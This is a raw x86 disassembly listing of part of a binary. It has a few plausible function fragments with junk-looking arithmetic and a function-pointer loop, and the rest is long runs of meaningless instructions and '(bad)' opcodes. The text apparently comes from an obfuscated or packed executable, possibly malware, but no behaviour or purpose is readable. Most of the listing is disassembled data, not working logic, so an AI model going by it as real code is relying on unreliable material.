  40997f:	jle    0x409915
  409981:	mov    ch,0xa1
  409983:	mov    eax,0xf43084c
  409988:	xor    DWORD PTR [ebp+ebp*4+0x16c567b4],edx
  40998f:	out    0x44,eax
  409991:	mov    al,0x93
  409993:	mov    cl,BYTE PTR [ecx]
  409995:	lea    edi,[ebx+0x27]
  409998:	das    
  409999:	loop   0x40997a
  40999b:	sahf   
  40999c:	adc    bl,0xa5
  40999f:	mov    ch,0x41
  4099a1:	adc    eax,0x8fea96a
  4099a6:	push   ds
  4099a7:	imul   edx,DWORD PTR [ebx-0x34],0x3341ddac
  4099ae:	push   ss
  4099af:	std    
  4099b0:	loop   0x4099ab
  4099b2:	xchg   ecx,eax
  4099b3:	xlat   BYTE PTR ds:[ebx]
  4099b4:	popa   
  4099b5:	inc    esi
  4099b6:	je     0x409939
  4099b8:	icebp  
  4099b9:	mov    dh,0xfb
  4099bb:	pop    ds
  4099bc:	mov    BYTE PTR [ecx-0x48b1b1f2],ch
  4099c2:	add    DWORD PTR [eax],ecx
  4099c4:	pop    edi
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fe8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e21c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e397
  4099eb:	mov    edi,DWORD PTR ds:0x42e3a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e89c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e224,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fdf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e21c
  409a3d:	sbb    DWORD PTR ds:0x42e7eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	not    ecx
  409a5a:	mov    eax,ebp
  409a5c:	xor    DWORD PTR [edi-0x608f8f14],eax
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a5c
  409a66:	gs cmp eax,0xfe245d6
  409a6c:	fiadd  DWORD PTR [edi]
  409a6e:	js     0x409a73
  409a70:	imul   edi,DWORD PTR [ebx-0x66],0x4d8c9230
  409a77:	push   edx
  409a78:	sub    ebx,ebx
  409a7a:	inc    edx
  409a7b:	or     esp,esp
  409a7d:	pop    edi
  409a7e:	(bad)  
  409a7f:	gs jge 0x409acf
  409a82:	sub    eax,0xcbdc502a
  409a87:	xchg   ebp,eax
  409a88:	jns    0x409a0b
  409a8a:	outs   dx,DWORD PTR ds:[esi]
  409a8b:	les    esi,FWORD PTR [ebp-0x55]
  409a8e:	mov    edi,0xaebd27fb
  409a93:	rcl    BYTE PTR ds:0xaa3242b0,cl
  409a99:	loop   0x409a2c
  409a9b:	call   0xdea479da
  409aa0:	adc    ebx,DWORD PTR [esi+0x3e660069]
  409aa6:	shl    DWORD PTR [ebx-0x648f4d32],cl
  409aac:	test   eax,0x410c6242
  409ab1:	mov    ds:0x5feb8d0b,al
  409ab6:	inc    esi
  409ab7:	stos   DWORD PTR es:[edi],eax
  409ab8:	sub    BYTE PTR [edi+0x3e],al
  409abb:	fwait
  409abc:	xor    BYTE PTR [edi+0x3f],dl
  409abf:	inc    edi
  409ac0:	lock and DWORD PTR [eax+0x3da8bb1f],ebp
  409ac7:	stc    
  409ac8:	ret    
  409ac9:	aad    0x2c
  409acb:	xor    eax,edx
  409acd:	mov    DWORD PTR [eax+0x42],eax
  409ad0:	jo     0x409a56
  409ad2:	cli    
  409ad3:	(bad)  
  409ad4:	adc    DWORD PTR [ebx-0x33],edx
  409ad7:	cwde   
  409ad8:	sub    ebp,esi
  409ada:	xchg   esp,eax
  409adb:	stos   BYTE PTR es:[edi],al
  409adc:	jns    0x409b16
  409ade:	sub    eax,0x2e19f7ff
  409ae3:	or     BYTE PTR [edx-0x6e7a5cb6],0xbd
  409aea:	(bad)  
  409aeb:	aas    
  409aec:	jle    0x409b52
  409aee:	xchg   BYTE PTR [ebx+edi*1+0x25],ah
  409af2:	or     esp,ecx
  409af4:	and    ebx,DWORD PTR [ecx]
  409af6:	sbb    eax,0xd97e8e0b
  409afb:	stos   DWORD PTR es:[edi],eax
  409afc:	adc    al,dh
  409afe:	enter  0x5b0d,0x86
  409b02:	cmp    DWORD PTR [ebx-0x52],eax
  409b05:	inc    esi
  409b06:	outs   dx,DWORD PTR ds:[esi]
  409b07:	pop    ebp
  409b08:	daa    
  409b09:	xor    eax,0x509ea43f
  409b0e:	adc    bl,BYTE PTR [edi-0x2fba9cbc]
  409b14:	inc    esi
  409b15:	cwde   
  409b16:	pop    ebp
  409b17:	cld    
  409b18:	xor    ecx,DWORD PTR [ebx+0x6b1b78c2]
  409b1e:	loop   0x409af1
  409b20:	data16 aam 0xb
  409b23:	sbb    dl,bl
  409b25:	mov    al,ds:0xdfd521f1
  409b2a:	push   ecx
  409b2b:	inc    esi
  409b2c:	xor    DWORD PTR [ebp+0x18edc583],ecx
  409b32:	or     bl,BYTE PTR [edi+esi*1-0x7c]
  409b36:	sub    eax,0x4bc31b37
  409b3b:	cmp    ch,BYTE PTR [esi+0x6f]
  409b3e:	mov    eax,ds:0x801cda40
  409b43:	stc    
  409b44:	frstor [esi-0x6a]
  409b47:	psraw  mm3,mm7
  409b4a:	jo     0x409ba6
  409b4c:	out    0x90,eax
  409b4e:	mov    ch,0x1f
  409b50:	stos   BYTE PTR es:[edi],al
  409b51:	push   ebx
  409b52:	(bad)  
  409b53:	sub    ah,bh
  409b55:	les    edi,FWORD PTR [edi]
  409b57:	and    esp,DWORD PTR [eiz*1+0x3f32311b]
  409b5e:	(bad)  
  409b5f:	dec    esi
  409b60:	hlt    
  409b61:	sbb    eax,0x59781208
  409b66:	(bad)  
  409b67:	retf   
  409b68:	jp     0x409b4a
  409b6a:	adc    DWORD PTR [ecx],edx
  409b6c:	gs daa 
  409b6e:	ja     0x409bb6
  409b70:	ins    BYTE PTR es:[edi],dx
  409b71:	mov    eax,0x89680ac6
  409b76:	pop    ebx
  409b77:	add    ch,bl
  409b79:	add    eax,0x7ff7274d
  409b7e:	cdq    
  409b7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b80:	and    DWORD PTR [edx-0x423a5aa6],esp
  409b86:	repz idiv BYTE PTR [ecx-0x546be122]
  409b8d:	in     eax,dx
  409b8e:	scas   eax,DWORD PTR es:[edi]
  409b8f:	addr16 jp 0x409b4d
  409b92:	leave  
  409b93:	add    eax,0xbdab9c1
  409b98:	and    edi,edx
  409b9a:	(bad)  
  409b9b:	out    dx,al
  409b9c:	xchg   edx,eax
  409b9d:	jle    0x409bb5
  409b9f:	jl     0x409b64
  409ba1:	mov    dh,0x7f
  409ba3:	xor    al,0x99
  409ba5:	test   DWORD PTR [ebx],ebp
  409ba7:	inc    edi
  409ba8:	test   eax,0x1f37856b
  409bad:	jns    0x409b88
  409baf:	repnz (bad) 
  409bb1:	aaa    
  409bb2:	js     0x409beb
  409bb4:	sub    eax,0x10d2b88
  409bb9:	es xchg edx,eax
  409bbb:	lods   al,BYTE PTR ds:[esi]
  409bbc:	mov    ss,WORD PTR [esi+ecx*8-0x23c2cd93]
  409bc3:	push   ss
  409bc4:	inc    esi
  409bc5:	in     eax,0x64
  409bc7:	push   ebp
  409bc8:	push   eax
  409bc9:	fxam   
  409bcb:	xor    eax,DWORD PTR [ebx]
  409bcd:	and    al,0x20
  409bcf:	inc    esp
  409bd0:	pop    es
  409bd1:	push   esi
  409bd2:	retf   
  409bd3:	xchg   esi,eax
  409bd4:	xor    eax,0x8ae9e0ae
  409bd9:	mov    ds:0x129a7b35,eax
  409bde:	mov    al,0x3c
  409be0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409be1:	jl     0x409be4
  409be3:	xlat   BYTE PTR ds:[ebx]
  409be4:	pop    ecx
  409be5:	sub    bh,BYTE PTR [eax+esi*2-0xe633902]
  409bec:	jmp    0x82a5:0xf29d9cd2
  409bf3:	fidiv  WORD PTR [ebx]
  409bf5:	cmp    esp,DWORD PTR [ebx+0x2689629]
  409bfb:	stc    
  409bfc:	aas    
  409bfd:	fistp  DWORD PTR [ecx]
  409bff:	addr16 pop ebx
  409c01:	and    eax,0xf137f5a2
  409c06:	idiv   ah
  409c08:	cmp    DWORD PTR [eax],ecx
  409c0a:	jae    0x409c4c
  409c0c:	dec    ebx
  409c0d:	jno    0x409c3a
  409c0f:	mov    ds:0xe596ff90,al
  409c14:	jb     0x409bc3
  409c16:	sub    ecx,DWORD PTR [esi-0x7e]
  409c19:	imul   BYTE PTR [esi]
  409c1b:	ins    DWORD PTR es:[edi],dx
  409c1c:	jle    0x409ba3
  409c1e:	sub    al,bl
  409c20:	inc    esi
  409c21:	mov    cl,0x3
  409c23:	fwait
  409c24:	not    BYTE PTR [edi+0x5494338a]
  409c2a:	xchg   ebx,eax
  409c2b:	push   cs
  409c2c:	stos   BYTE PTR es:[edi],al
  409c2d:	call   0x87f8534a
  409c32:	or     ebx,DWORD PTR [edx-0x7f]
  409c35:	pusha  
  409c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c37:	jp     0x409c99
  409c39:	dec    ebp
  409c3a:	mov    dh,0x53
  409c3c:	mov    ah,0x79
  409c3e:	mov    bl,BYTE PTR [esi+0x72d7906]
  409c44:	mov    DWORD PTR [ecx-0x30],ecx
  409c47:	(bad)  
  409c48:	xor    eax,0x339f5567
  409c4d:	inc    ebx
  409c4e:	pop    edx
  409c4f:	ins    BYTE PTR es:[edi],dx
  409c50:	ss loopne 0x409bed
  409c53:	mov    bl,0x32
  409c55:	pusha  
  409c56:	daa    
  409c57:	fs and dl,bl
  409c5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c5b:	mov    ah,0x11
  409c5d:	jmp    0xad4736b1
  409c62:	xor    al,BYTE PTR [esi]
  409c64:	jmp    0x409c45
  409c66:	inc    edx
  409c67:	jno    0x409bf7
  409c69:	mov    edi,0xe04ff59e
  409c6e:	push   es
  409c6f:	sub    dh,BYTE PTR [eax-0x78]
  409c72:	je     0x409c5d
  409c74:	test   eax,0x4d10ef37
  409c79:	scas   al,BYTE PTR es:[edi]
  409c7a:	push   esp
  409c7b:	rcl    BYTE PTR [ebx-0x3],cl
  409c7e:	dec    esp
  409c7f:	and    edi,DWORD PTR [esi+0x35]
  409c82:	idiv   BYTE PTR [edx+0x47bb3eb6]
  409c88:	lea    ecx,[eax-0x12177150]
  409c8e:	pop    eax
  409c8f:	lods   al,BYTE PTR ds:[esi]
  409c90:	push   esi
  409c91:	mov    esi,0xcfbdfdf4
  409c96:	push   es
  409c97:	ret    
  409c98:	aad    0xb4
  409c9a:	xor    DWORD PTR [ebx-0x20],ebx
  409c9d:	es cld 
  409c9f:	popf   
  409ca0:	adc    edi,DWORD PTR [eax+0x1f]
  409ca3:	rcr    DWORD PTR [eax],1
  409ca5:	jmp    0x2603ef9d
  409caa:	pop    es
  409cab:	dec    esi
  409cac:	in     eax,dx
  409cad:	repnz mov BYTE PTR [edi*4+0xac7dfa0],bl
  409cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cb6:	inc    ecx
  409cb7:	push   edi
  409cb8:	cmp    eax,0x5135ab89
  409cbd:	call   0xef6ceccf
  409cc2:	das    
  409cc3:	xor    edx,DWORD PTR [ebp-0x7c806242]
  409cc9:	mov    ds:0x8728e653,al
  409cce:	das    
  409ccf:	out    0xed,al
  409cd1:	adc    DWORD PTR [ecx],ebp
  409cd3:	inc    ebp
  409cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cd5:	sub    BYTE PTR [ecx+0x28f699c0],al
  409cdb:	retf   0x3d1a
  409cde:	mov    esi,0x7d9c9944
  409ce3:	rol    BYTE PTR [edx+esi*4],cl
  409ce6:	retf   
  409ce7:	js     0x409c96
  409ce9:	xor    eax,0xc96b6fb2
  409cee:	sar    DWORD PTR [edx],0x63
  409cf1:	out    0x9,al
  409cf3:	imul   esp,DWORD PTR ds:0x6d40d36f,0x12b1948b
  409cfd:	dec    ebp
  409cfe:	lea    edi,[ebx]
  409d00:	mov    eax,0x4f956eed
  409d05:	jo     0x409cc3
  409d07:	imul   edx,DWORD PTR [edi-0xb200d1f],0xfffffffc
  409d0e:	add    ecx,DWORD PTR [edx]
  409d10:	lods   al,BYTE PTR ds:[esi]
  409d11:	ja     0x409cc1
  409d13:	dec    ecx
  409d14:	shr    DWORD PTR [esi],cl
  409d16:	mov    BYTE PTR [edi+edi*2-0x1515592d],0x2a
  409d1e:	xchg   ecx,eax
  409d1f:	test   DWORD PTR [ecx-0x10],0x44d084
  409d26:	(bad)  
  409d27:	mov    esi,0x561eda94
  409d2c:	mov    al,0xbd
  409d2e:	aam    0x33
  409d30:	pusha  
  409d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d32:	int3   
  409d33:	mov    esp,0x1f951eab
  409d38:	std    
  409d39:	mov    eax,0xcac5aa3b
  409d3e:	les    esp,FWORD PTR [edx]
  409d40:	pop    ss
  409d41:	add    edi,DWORD PTR [edi-0x70]
  409d44:	test   eax,0x6ccf8e46
  409d49:	pushf  
  409d4a:	mov    ch,BYTE PTR [ecx-0x5]
  409d4d:	push   eax
  409d4e:	fmul   QWORD PTR [edx-0x475ddbaf]
  409d54:	xchg   BYTE PTR [esi+0x31],ch
  409d57:	or     al,0x9d
  409d59:	mov    eax,0x1ae6ebd3
  409d5e:	inc    edx
  409d5f:	fimul  DWORD PTR [esi]
  409d61:	es jge 0x409d28
  409d64:	jo     0x409d92
  409d66:	(bad)  
  409d68:	repz or eax,0x3da51f24
  409d6e:	pop    ebx
  409d6f:	add    BYTE PTR [edi],ch
  409d71:	lods   eax,DWORD PTR ds:[esi]
  409d72:	fsubr  DWORD PTR [ecx+0x1c]
  409d75:	pop    edx
  409d76:	(bad)  
  409d77:	sbb    BYTE PTR [ebx+0x736e038a],bl
  409d7d:	cdq    
  409d7e:	outs   dx,BYTE PTR ds:[esi]
  409d7f:	rcr    DWORD PTR [ebx],cl
  409d81:	fstp   QWORD PTR [edx-0x48]
  409d84:	cdq    
  409d85:	ins    DWORD PTR es:[edi],dx
  409d86:	cmp    al,0x22
  409d88:	jle    0x409e01
  409d8a:	jnp    0x409dae
  409d8c:	push   ss
  409d8d:	mov    ebx,0x5e23dfae
  409d92:	cdq    
  409d93:	mov    edi,0xc4c011c4
  409d98:	adc    al,0x94
  409d9a:	ins    DWORD PTR es:[edi],dx
  409d9b:	outs   dx,DWORD PTR ds:[esi]
  409d9c:	(bad)  
  409d9d:	pusha  
  409d9e:	mov    eax,0x3ab30153
  409da3:	ins    DWORD PTR es:[edi],dx
  409da4:	mov    eax,0x441c72ad
  409da9:	ret    0x3dbf
  409dac:	repz out dx,eax
  409dae:	xchg   edi,eax
  409daf:	rcl    dh,1
  409db1:	inc    ebp
  409db2:	sbb    ecx,DWORD PTR [ecx-0x1b]
  409db5:	clc    
  409db6:	jno    0x409d68
  409db8:	sbb    BYTE PTR [ecx-0x56],bl
  409dbb:	stos   BYTE PTR es:[edi],al
  409dbc:	cwde   
  409dbd:	iret   
  409dbe:	push   cs
  409dbf:	push   ds
  409dc0:	test   DWORD PTR [edi+eiz*2],edi
  409dc3:	pop    edx
  409dc4:	in     al,0x26
  409dc6:	repnz stos DWORD PTR es:[edi],eax
  409dc8:	stos   DWORD PTR es:[edi],eax
  409dc9:	mov    bl,0x45
  409dcb:	int3   
  409dcc:	je     0x409d77
  409dce:	pop    es
  409dcf:	lahf   
  409dd0:	mov    eax,ds:0x19e23e26
  409dd5:	push   ss
  409dd6:	cmp    al,0x12
  409dd8:	dec    esp
  409dd9:	mov    eax,0xc0504190
  409dde:	iret   
  409ddf:	sub    dh,BYTE PTR [ecx+ecx*8]
  409de2:	scas   al,BYTE PTR es:[edi]
  409de3:	repnz adc BYTE PTR [esi-0x778f4b6f],ah
  409dea:	inc    ecx
  409deb:	outs   dx,DWORD PTR ds:[esi]
  409dec:	mov    cl,0xfe
  409dee:	loop   0x409e06
  409df0:	scas   al,BYTE PTR es:[edi]
  409df1:	test   eax,0xd716978f
  409df6:	outs   dx,DWORD PTR ds:[esi]
  409df7:	fs mov ch,0xe
  409dfa:	pop    ds
  409dfb:	and    DWORD PTR [eax-0x40],esi
  409dfe:	loopne 0x409d8b
  409e00:	sbb    DWORD PTR gs:[eax-0x29],ecx
  409e04:	pop    DWORD PTR [ebx]
  409e06:	add    edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fe8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fdf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e224
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fe82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fe82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fe82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e3e3
  409e51:	mov    edi,DWORD PTR ds:0x42fe82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fe82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e803,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	arpl   WORD PTR [ecx-0x17d96445],sp
  409e87:	jo     0x409ef9
  409e89:	lahf   
  409e8a:	jge    0x409efc
  409e8c:	jo     0x409ee0
  409e8e:	or     eax,0xc0ed6dc1
  409e93:	imul   edi,DWORD PTR [edi],0xf09bd19e
  409e99:	scas   eax,DWORD PTR es:[edi]
  409e9a:	gs (bad) 
  409e9c:	jns    0x409e31
  409e9e:	push   cs
  409e9f:	or     BYTE PTR [bx+di-0x93e],dl
  409ea4:	retf   0xdbcc
  409ea7:	mov    esp,0xd80b5edd
  409eac:	sbb    BYTE PTR [esi+0x14],ah
  409eaf:	int3   
  409eb0:	pop    ebp
  409eb1:	fadd   DWORD PTR [esi+0x69]
  409eb4:	fnsave [edx]
  409eb6:	addr16 jl 0x409ee0
  409eb9:	das    
  409eba:	lea    esp,[edx-0x1f]
  409ebd:	(bad)  
  409ebe:	stos   BYTE PTR es:[edi],al
  409ebf:	sub    eax,0xfbb4fb3c
  409ec4:	cmp    al,0x1f
  409ec6:	and    al,dl
  409ec8:	dec    esi
  409ec9:	sub    eax,0xc5a02248
  409ece:	adc    DWORD PTR [ecx+ebp*4-0x3f6c258b],ebp
  409ed5:	pop    ss
  409ed6:	cmp    BYTE PTR [edi+ebp*8],ah
  409ed9:	adc    BYTE PTR [edx+0x4d],dl
  409edc:	push   es
  409edd:	xor    eax,0x235e522f
  409ee2:	adc    bl,BYTE PTR [edx+0x702229e4]
  409ee8:	leave  
  409ee9:	jo     0x409f36
  409eeb:	fsub   st(1),st
  409eed:	scas   al,BYTE PTR es:[edi]
  409eee:	or     ch,BYTE PTR [eax-0x22a0a400]
  409ef4:	loopne 0x409eb7
  409ef6:	or     DWORD PTR [ebx+0x2],0x7125cd66
  409efd:	xor    BYTE PTR [edi+edi*4],bl
  409f00:	lsl    ebp,WORD PTR [ebp+0x29ded4ef]
  409f07:	cmp    dl,dh
  409f09:	sbb    esp,ebp
  409f0b:	mov    al,0xbe
  409f0d:	lods   eax,DWORD PTR ds:[esi]
  409f0e:	call   0xc8e4ef8b
  409f13:	rcr    BYTE PTR [ecx-0x3d1e5e03],cl
  409f19:	jb     0x409f1a
  409f1b:	mov    esp,0x115c051d
  409f20:	pop    ds
  409f21:	call   0xd8410a93
  409f26:	sub    cl,BYTE PTR [ebx+0x54381d68]
  409f2c:	adc    BYTE PTR [edi-0x539fb8e7],bh
  409f32:	ja     0x409f9b
  409f34:	pop    esp
  409f35:	imul   edi,DWORD PTR [edi-0x7e34efbf],0xb46127a0
  409f3f:	icebp  
  409f40:	sti    
  409f41:	jae    0x409f91
  409f43:	sbb    ah,bl
  409f45:	mov    gs,WORD PTR [edx]
  409f47:	sbb    BYTE PTR [esi+0x1f],al
  409f4a:	jg     0x409f06
  409f4c:	mov    al,0x98
  409f4e:	outs   dx,DWORD PTR ds:[esi]
  409f4f:	in     al,0x44
  409f51:	mov    eax,ds:0x675cb45a
  409f56:	xchg   esp,eax
  409f57:	adc    al,0x39
  409f59:	shr    DWORD PTR [ebx-0x56],1
  409f5c:	outs   dx,DWORD PTR ds:[esi]
  409f5d:	stos   BYTE PTR es:[edi],al
  409f5e:	(bad)  [edx+ebx*1-0x1317bf5d]
  409f65:	das    
  409f66:	das    
  409f67:	xor    al,0xb
  409f69:	enter  0x8aef,0x46
  409f6d:	jecxz  0x409f25
  409f6f:	rcl    DWORD PTR [eax-0x16],0x73
  409f73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f74:	xor    bh,cl
  409f76:	and    dx,ax
  409f79:	sti    
  409f7a:	mov    eax,0x2228f0d3
  409f7f:	jecxz  0x409ffe
  409f81:	sub    al,0xd9
  409f83:	mov    ch,0xf8
  409f85:	clc    
  409f86:	xor    ch,ah
  409f88:	ficom  WORD PTR [ebx+0x3f356246]
  409f8e:	xchg   esp,eax
  409f8f:	cmp    BYTE PTR [eax-0x2f],cl
  409f92:	mov    edx,0x6c8518a0
  409f97:	and    eax,0x3e269e
  409f9c:	sbb    bh,BYTE PTR [ecx]
  409f9e:	bound  esi,QWORD PTR [edi+0x1419d24e]
  409fa4:	pop    ds
  409fa5:	call   0xc8d2a6db
  409faa:	push   0x4d
  409fac:	rol    BYTE PTR [ecx-0x33],0x29
  409fb0:	inc    edi
  409fb1:	sbb    eax,esi
  409fb3:	cmp    ch,ch
  409fb5:	jecxz  0x409fe8
  409fb7:	enter  0x8dba,0x25
  409fbb:	stos   DWORD PTR es:[edi],eax
  409fbc:	sub    bh,bh
  409fbe:	mov    WORD PTR [ebp-0x67],ds
  409fc1:	xor    eax,0x9512c2
  409fc6:	push   esp
  409fc7:	jns    0x409f56
  409fc9:	xchg   DWORD PTR [ecx+0x79abb054],ebp
  409fcf:	inc    eax
  409fd0:	jmp    0x409fd0
  409fd2:	adc    eax,0xc84a2435
  409fd7:	iret   
  409fd8:	mov    al,ds:0x5c66f7b3
  409fdd:	gs jae 0x409fff
  409fe0:	daa    
  409fe1:	and    al,0x83
  409fe3:	out    dx,al
  409fe4:	xchg   edi,eax
  409fe5:	jnp    0x40a034
  409fe7:	pop    es
  409fe8:	test   BYTE PTR [esi+0x75a015c3],ch
  409fee:	cmp    eax,0x22c9a03
  409ff3:	stos   BYTE PTR es:[edi],al
  409ff4:	ins    DWORD PTR es:[edi],dx
  409ff5:	enter  0x89c0,0x6a
  409ff9:	inc    ebx
  409ffa:	push   esp
  409ffb:	inc    esp
  409ffc:	adc    DWORD PTR [ebx+0x5a],0x4a
  40a000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a001:	arpl   sp,di
  40a003:	cwde   
  40a004:	ins    BYTE PTR es:[edi],dx
  40a005:	mov    al,0x53
  40a007:	sbb    DWORD PTR [ebx+0x4c],eax
  40a00a:	lods   eax,DWORD PTR ds:[esi]
  40a00b:	(bad)  
  40a00c:	dec    esi
  40a00d:	mov    dl,0x52
  40a00f:	add    DWORD PTR [ecx],esi
  40a011:	xor    dl,ch
  40a013:	mul    DWORD PTR [edi+0x3ef74d4b]
  40a019:	daa    
  40a01a:	es xchg esp,eax
  40a01c:	mov    ecx,0x320577bc
  40a021:	sub    esp,DWORD PTR ds:0xc1a16b81
  40a027:	pop    esi
  40a028:	or     DWORD PTR [esi-0x6615a59a],eax
  40a02e:	aad    0x39
  40a030:	push   ebp
  40a031:	cmp    al,0xbd
  40a033:	rol    DWORD PTR [edx-0x58da7769],cl
  40a039:	dec    esi
  40a03a:	mov    bh,0xcf
  40a03c:	inc    esp
  40a03d:	cmp    al,0xfd
  40a03f:	add    BYTE PTR [edi+edx*8+0x20],dl
  40a043:	cli    
  40a044:	inc    esi
  40a045:	repz inc ecx
  40a047:	bound  ebp,QWORD PTR [edi-0x43d445ce]
  40a04d:	push   ds
  40a04e:	cmp    al,0x96
  40a050:	ds mov bh,0xc6
  40a053:	fwait
  40a054:	xchg   edx,eax
  40a055:	mov    bh,0x9a
  40a057:	jecxz  0x40a0ca
  40a059:	sbb    dl,BYTE PTR [ebp+0x23cefb67]
  40a05f:	pop    ds
  40a060:	jmp    0xd9e78aee
  40a065:	in     eax,dx
  40a066:	xchg   ebp,eax
  40a067:	cmp    al,al
  40a069:	jmp    0xd23c:0xf1e15ef7
  40a070:	outs   dx,DWORD PTR ds:[esi]
  40a071:	ss push ecx
  40a073:	sbb    DWORD PTR [esp+ebp*2+0x3c],edx
  40a077:	out    0xf,al
  40a079:	sbb    eax,0xe1d02768
  40a07e:	mov    ds:0x834346d3,eax
  40a083:	sbb    eax,0x6ecf4a60
  40a088:	dec    esp
  40a089:	xchg   esi,eax
  40a08a:	jnp    0x40a105
  40a08c:	xor    bh,BYTE PTR [ebp+0x12aafc4e]
  40a092:	inc    esi
  40a093:	call   0xa168:0xccf03588
  40a09a:	pop    ebp
  40a09b:	test   eax,0xeedb1e1d
  40a0a0:	sub    al,0xec
  40a0a2:	xchg   esp,eax
  40a0a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0a4:	push   ds
  40a0a5:	pop    ss
  40a0a6:	into   
  40a0a7:	dec    ebx
  40a0a8:	mov    ecx,esi
  40a0aa:	in     eax,0x4c
  40a0ac:	int    0x5
  40a0ae:	repnz cs stos BYTE PTR es:[edi],al
  40a0b1:	xchg   BYTE PTR [ecx-0x76],bl
  40a0b4:	pop    ecx
  40a0b5:	lods   al,BYTE PTR ds:[esi]
  40a0b6:	ins    DWORD PTR es:[edi],dx
  40a0b7:	sub    DWORD PTR [edx-0x3d],eax
  40a0ba:	xchg   dl,bh
  40a0bc:	imul   eax,DWORD PTR ds:0xd80cc419,0x28
  40a0c3:	mov    al,0x59
  40a0c5:	ins    DWORD PTR es:[edi],dx
  40a0c6:	and    al,0x88
  40a0c8:	adc    BYTE PTR [edx+esi*8-0x2],cl
  40a0cc:	fs inc esp
  40a0ce:	mov    BYTE PTR [ecx+eiz*4],al
  40a0d1:	dec    esp
  40a0d2:	jl     0x40a063
  40a0d4:	lods   eax,DWORD PTR ds:[esi]
  40a0d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0d6:	outs   dx,DWORD PTR ds:[esi]
  40a0d7:	mov    bl,0xfa
  40a0d9:	test   BYTE PTR [eax],bh
  40a0db:	cmovge esp,DWORD PTR [esi]
  40a0de:	cmc    
  40a0df:	push   edi
  40a0e0:	adc    BYTE PTR [ebx-0x1c7dad15],al
  40a0e6:	call   0xb61e628e
  40a0eb:	sbb    DWORD PTR ss:[edx],edi
  40a0ee:	hlt    
  40a0ef:	sub    al,0xff
  40a0f1:	aaa    
  40a0f2:	mov    DWORD PTR [ebx],ebx
  40a0f4:	pop    ebp
  40a0f5:	push   0x47
  40a0f7:	and    eax,0xfbb1e297
  40a0fc:	jle    0x40a0e3
  40a0fe:	add    al,0xac
  40a100:	iret   
  40a101:	add    BYTE PTR [edi-0x2c],dl
  40a104:	pop    es
  40a105:	popf   
  40a106:	aad    0x2e
  40a108:	sahf   
  40a109:	into   
  40a10a:	jae    0x40a124
  40a10c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a10d:	sahf   
  40a10e:	aam    0x9f
  40a110:	push   esi
  40a111:	ds dec ebp
  40a113:	xor    BYTE PTR [ebx+0x7ba7442c],al
  40a119:	scas   al,BYTE PTR es:[edi]
  40a11a:	mov    ebx,0x259f3a83
  40a11f:	lods   eax,DWORD PTR ds:[esi]
  40a120:	data16 (bad) 
  40a122:	ins    BYTE PTR es:[edi],dx
  40a123:	sub    bh,ch
  40a125:	push   0x5db881ca
  40a12a:	fstp   TBYTE PTR [ecx+0x6c37e6bf]
  40a130:	xor    edi,0xf294c174
  40a136:	(bad)  
  40a137:	xor    ch,dl
  40a139:	arpl   WORD PTR [ebp-0x45],si
  40a13c:	push   ds
  40a13d:	fwait
  40a13e:	aas    
  40a13f:	pop    ebx
  40a140:	inc    eax
  40a141:	xchg   DWORD PTR [edx+0x1d640ee4],esp
